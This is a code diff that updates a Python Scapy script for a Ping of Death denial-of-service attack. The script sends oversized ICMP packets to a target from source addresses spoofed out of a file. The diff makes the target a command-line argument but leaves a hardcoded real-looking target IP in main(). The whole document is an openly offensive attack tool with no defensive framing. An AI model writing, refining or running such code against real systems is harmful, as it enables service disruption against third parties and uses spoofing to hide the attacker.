@@ -8,6 +8,7 @@ Description:
 """
 
 from scapy.all import IP, ICMP, send
+import sys
 
 class Style:
     RED = '\033[31m'
@@ -17,6 +18,8 @@ class Style:
     RESET = '\033[0m'
 
 style = Style()
+
+PAYLOAD = b"A" * 65500
 
 def read_ips():
     filename = "ips.txt"
@@ -33,29 +36,30 @@ def send_pod_attack(source_ip, target_ip):
     Send fragmented ICMP packets to simulate Ping of Death (PoD).
     """
     try:
-        # create an oversize paylaod
-        # payload that larger than the maximum size
-        oversize_payload = b"A" * 65535
-
         # construct the packets
         ip_packet = IP(src=source_ip, dst=target_ip)
         icmp_packet = ICMP()
-        fragmented_packets = ip_packet / icmp_packet / oversize_payload
+        fragmented_packets = ip_packet / icmp_packet / PAYLOAD
 
         # send the fragmented packets
         send(5 * fragmented_packets, verbose = False)
-        print(style.GREEN + f"Ping of death packets send to {target_ip}" + style.RESET)
+        print(style.GREEN + f"Ping of death packets send from {source_ip } to {target_ip}" + style.RESET)
     except Exception as e:
         print(style.RED + f"[-]ERROR: {e}" + style.RESET)
 
 def process(target_ip):
     ips = read_ips()
-    for ip in ips:
-        send_pod_attack(ip, target_ip)
+    for source_ip in ips:
+        send_pod_attack(source_ip, target_ip)
 
 def main():
     target_ip = "162.210.97.174"
-    process(target_ip)
+    if len(sys.argv) != 2:
+        print("USAGE: file-name [target]")
+        return
+
+    target = sys.argv[1]
+    process(target)
     
 if __name__ == "__main__":
     main()
